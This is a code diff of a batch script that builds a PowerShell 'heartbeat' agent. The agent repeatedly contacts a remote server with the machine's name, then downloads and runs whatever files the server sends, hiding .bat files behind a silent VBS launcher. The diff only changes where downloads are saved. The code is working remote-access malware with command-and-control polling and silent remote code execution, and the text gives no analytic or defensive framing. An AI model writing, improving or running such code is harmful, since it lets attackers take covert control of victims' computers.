@@ -2,6 +2,8 @@
 :: Create or overwrite the PowerShell script "heartbeat.ps1"
 echo $pcName = $env:COMPUTERNAME > heartbeat.ps1
 echo $url = "http://byxln4cj.atwebpages.com/update.php" >> heartbeat.ps1
+echo $downloadFolder = [System.IO.Path]::Combine($env:USERPROFILE, "Downloads") >> heartbeat.ps1
+echo if (-not (Test-Path $downloadFolder)) { New-Item -ItemType Directory -Path $downloadFolder | Out-Null } >> heartbeat.ps1
 echo while ($true) { >> heartbeat.ps1
 echo     try { >> heartbeat.ps1
 echo         $response = Invoke-RestMethod -Uri $url -Method POST -Body @{ pc_name = $pcName } >> heartbeat.ps1
@@ -12,15 +14,19 @@ echo                 "download_run" { >> heartbeat.ps1
 echo                     $uri = [System.Uri]$response.value >> heartbeat.ps1
 echo                     $fileName = [System.IO.Path]::GetFileName($uri.LocalPath) >> heartbeat.ps1
 echo                     if (-not $fileName) { $fileName = "downloaded_file" } >> heartbeat.ps1
-echo                     $tempPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $fileName) >> heartbeat.ps1
-echo                     Invoke-WebRequest -Uri $response.value -OutFile $tempPath >> heartbeat.ps1
-echo                     if ($tempPath -like "*.bat") { >> heartbeat.ps1
+echo                     if ($fileName -like "*.bat") { >> heartbeat.ps1
+echo                         $downloadPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), $fileName) >> heartbeat.ps1
+echo                     } else { >> heartbeat.ps1
+echo                         $downloadPath = [System.IO.Path]::Combine($downloadFolder, $fileName) >> heartbeat.ps1
+echo                     } >> heartbeat.ps1
+echo                     Invoke-WebRequest -Uri $response.value -OutFile $downloadPath >> heartbeat.ps1
+echo                     if ($downloadPath -like "*.bat") { >> heartbeat.ps1
 echo                         $vbsPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "run_silent.vbs") >> heartbeat.ps1
-echo                         $vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.Run """' + $tempPath + '""", 0, False' >> heartbeat.ps1
+echo                         $vbsContent = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.Run """' + $downloadPath + '""", 0, False' >> heartbeat.ps1
 echo                         Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII >> heartbeat.ps1
 echo                         Start-Process -FilePath $vbsPath >> heartbeat.ps1
 echo                     } else { >> heartbeat.ps1
-echo                         Start-Process -FilePath $tempPath -WindowStyle Maximized >> heartbeat.ps1
+echo                         Start-Process -FilePath $downloadPath -WindowStyle Maximized >> heartbeat.ps1
 echo                     } >> heartbeat.ps1
 echo                 } >> heartbeat.ps1
 echo                 "set_wallpaper" { >> heartbeat.ps1
